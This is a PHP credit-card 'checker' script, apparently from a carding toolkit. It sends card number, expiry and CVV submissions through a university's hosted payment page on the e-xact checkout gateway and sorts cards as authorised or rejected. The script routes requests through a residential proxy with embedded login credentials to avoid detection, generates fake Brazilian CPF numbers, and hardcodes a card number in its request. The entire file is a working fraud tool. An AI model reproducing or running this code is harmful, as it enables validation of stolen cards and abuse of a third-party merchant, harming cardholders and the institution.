
<?php
ini_set("display_errors",0);
error_reporting(0);
include("verifica.php");
if($_GET["acao"] == logout){
setcookie("logado","");
echo'
<script type="text/javascript">
alert("Você foi deslogado com sucesso, redirecionando...");
location="index.php";
</script>
';
}
?>
<?php
error_reporting(0);
set_time_limit(0);
   function value($string, $start, $end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
    }
function getstr($string, $start, $end, $offset = 1) {
    $str = explode($start, $string);
    $str = explode($end, $str[$offset]);
    return $str[0];
}
    

if($_GET['testar']=="cc"){
    $ccs = $_GET['ccs'];
    $separador  = $_GET['separador'];
    $id     = $_GET['id'];
    $explode = explode($separador, $ccs);


$numero = $explode[0];
$mes = $explode[1];
$ano = $explode[2];
$cvv = $explode[3];
$cc = substr($numero,0,6);
$random = mt_rand(1,1000);

$ss = substr($numero, 0, 2);


if($ss[0] == "4"){
$bandeira = "Visa";
}

elseif($ss[0] == "5"){
$bandeira = "MasterCard";
}

elseif($ss[0] == "37"){
$bandeira = "American Express";
}

elseif($ss[0] == "60"){
$bandeira = "Discover";
}
	elseif($ss[0] == "36"){
$bandeira = "diners";
}	 
     } 
	 
	 
/*	 
	 switch ($mes){
	
	case "01":
	$mes = "January";
	break;
	case "02":
	$mes = "February";
	break;
	case "03":
	$mes = "March";
	break;
	case "04":
	$mes = "April";
	break;
	case "05":
	$mes = "May";
	break;
	case "06":
	$mes = "June";
	break;
	case "07":
	$mes = "July";
	break;
	case "08":
	$mes = "August";
	break;
	case "09":
	$mes = "September";
	break;
	case "10":
	$mes = "October";
	break;
	case "11":
	$mes = "November";
	break;
	case "12":
	$mes = "December";
	break;
     }
*/

$username = 'lum-customer-hl_5056b531-zone-static';
$password = 'wtkmwp7fan9w';
$port = 22225;
$user_agent = 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko';
$session = mt_rand();
$super_proxy = 'zproxy.lum-superproxy.io';
$random = mt_rand();
$random_cvv = mt_rand(111,999);

     
 $num = array();
    $num[9]=$num[10]=$num[11]=0;
    for ($w=0; $w > -2; $w--){
        for($i=$w; $i < 9; $i++){
            $x=($i-10)*-1;
            $w==0?$num[$i]=rand(0,9):'';
           
            ($w==-1 && $i==$w && $num[11]==0)?
                $num[11]+=$num[10]*2    :
                $num[10-$w]+=$num[$i-$w]*$x;
        }
        $num[10-$w]=(($num[10-$w]%11)<2?0:(11-($num[10-$w]%11)));
       $cpf = ''.$num[0].$num[1].$num[2].'.'.$num[3].$num[4].$num[5].'.'.$num[6].$num[7].$num[8].'-'.$num[10].$num[11];
    }


        


if(file_exists(getcwd().'/cookiess.txt')) {
        unlink(getcwd().'/cookiess.txt'); 
    }
 
 
 $str12 = "abcdefasdfv";
$nome_random1 = str_shuffle($str12);


$randomId = mt_rand(1,99999);
$phonenumberrand = mt_rand(0000000000,9999999999);
$str = "AaBbCcDdEeF";
$codigoss = str_shuffle($str);

$valordedebito = mt_rand(10,20);
$cvvrand = mt_rand(000,999);
$cvvrand1 = mt_rand(00000,999999);








	
		$ch = curl_init();
	
    curl_setopt($ch, CURLOPT_URL,'https://checkout.e-xact.com/payment');
    $headr = array();
    $headr[] = 'Host: checkout.e-xact.com';
	$headr[] = 'Origin: https://cbm.adm.ubc.ca';
    $headr[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36';
	$headr[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3';
	$headr[] = 'Referer: https://cbm.adm.ubc.ca/creditcardservice/CreditCardPaymentForm?SRCE_TYP_CD=CCPD&TRAN_AMOUNT=125&TICKET=s16a28484e891125688232&GL_ACCT_CD=G0000272004%2027G09275241000&MERCHANT_TRANS_ID=2807923-E1870844&PYMT_TYPE_OPTION=C&CONTINUE_URL=https%3a%2f%2fevents.eply.com%2fpay%2fpayment-processed.aspx%3fePlyGateway%3dePayment&NOTIFY_URL=https%3a%2f%2fevents.eply.com%2fpay%2fpayment-processed.aspx%3fePlyGateway%3dePayment&ITEM_DESCRIPTION=(Course%20Registration,Allied%20Health%20(nurses,%20occupa';
    curl_setopt($ch, CURLOPT_HTTPHEADER,$headr);
    //curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
    //curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-dns-local-session-$session:$password");
	curl_setopt($ch, CURLOPT_TIMEOUT,15);
    curl_setopt($ch, CURLOPT_HEADER,0);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION,1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER,0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST,0);
    curl_setopt($ch, CURLOPT_VERBOSE,1);
    curl_setopt($ch, CURLOPT_COOKIESESSION,false);
    curl_setopt($ch, CURLOPT_COOKIEJAR,getcwd().'/cookiess.txt');
    curl_setopt($ch, CURLOPT_COOKIEFILE,getcwd().'/cookiess.txt');
    curl_setopt($ch, CURLOPT_POST,true);
    curl_setopt($ch, CURLOPT_POSTFIELDS,'x_login=WSP-UBC-141-959&x_fp_sequence=7743833&x_fp_timestamp=1555453990&x_amount=125&x_fp_hash=3b07994387041b0fd329587404655254&x_invoice_num=16883532&x_cust_id=5343906&x_po_num=CCPD%3A99999999&x_reference_3=WEBSRV%3ACCPD%3A99999999&merchant_cookie_1=5343906&x_receipt_link_url=https%3A%2F%2Fcbm.adm.ubc.ca%2Fcreditcardservice%2FPaymentReceipt%3FuserEvent%3Drelayresponse&x_receipt_link_text=Cancel+Payment+Request&x_show_form=PAYMENT_FORM');
	$curl = curl_exec($ch); // Resultado
	//$uenc1 = getStr($curl, '{"product":"13068","uenc":"','"',1);
	

	$ch = curl_init();
	
    curl_setopt($ch, CURLOPT_URL,'https://checkout.e-xact.com/payment/cc_payment');
    $headr = array();
    $headr[] = 'Host: checkout.e-xact.com';
	$headr[] = 'Origin: https://checkout.e-xact.com';
    $headr[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36';
	$headr[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3';
	$headr[] = 'Referer: https://checkout.e-xact.com/payment/payment_completion?merchant=WSP-UBC-141-959&order=08f7903e0ce5c73beeaeccdf8d7d8fe87d57c5540545156b0913df0d099f6c9a&t=2';
    curl_setopt($ch, CURLOPT_HTTPHEADER,$headr);
    curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-dns-local-session-$session:$password");
	curl_setopt($ch, CURLOPT_TIMEOUT,15);
    curl_setopt($ch, CURLOPT_HEADER,0);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION,1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER,0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST,0);
    curl_setopt($ch, CURLOPT_VERBOSE,1);
    curl_setopt($ch, CURLOPT_COOKIESESSION,false);
    curl_setopt($ch, CURLOPT_COOKIEJAR,getcwd().'/cookiess.txt');
    curl_setopt($ch, CURLOPT_COOKIEFILE,getcwd().'/cookiess.txt');
    curl_setopt($ch, CURLOPT_POST,true);
    curl_setopt($ch, CURLOPT_POSTFIELDS,'exact_cardholder_name=scxd+asdasd&servdt5=1&merchant=WSP-UBC-141-959&x_card_num=5522894607616731&x_exp_date=0220&x_card_code=554&cvd_presence_ind=1&commit=Pay+With+Your+Credit+Card');
	$curl = curl_exec($ch); // Resultado
	$uenc1 = getStr($curl, '<td class="errorMessages"><b>','</b></td>',1);
	
	echo $curl;
	//%2B%2B%2B
	
	
		
	 

	
	
	



	




         // $dados = curl_exec($ch);
          //  $token = getStr($dados, '"id":"','",');
   
        //Subscription Complete
        if(strpos($curl, "Approved")!==false){

		echo" Autorizada - $numero $mes $ano $cvv $payment_resposta [ $bindacc | $bandeiradacc | $typedacc | $leveldacc | $bancodacc | $paisdacc ] [Payment resposta: $payment_resposta22] #AlexinChecker <br>";

   }
   elseif(strpos($curl, "Your billing information does not match your credit card")!==false){

		echo" Autorizada - $numero $mes $ano $cvv $payment_resposta [ $bindacc | $bandeiradacc | $typedacc | $leveldacc | $bancodacc | $paisdacc ] [Payment resposta: $payment_resposta22] #AlexinChecker <br>";

   }
      
   else{ 
   
    echo" Reprovada - $numero $mes $ano $cvv $payment_resposta Resposta do pagamento: $payment_resposta22 #CC INVALIDA <br>";
 

          
    }

	
		if(file_exists(getcwd().'/testeasd.txt')) {
        unlink(getcwd().'/testeasd.txt'); 
    }
	


?>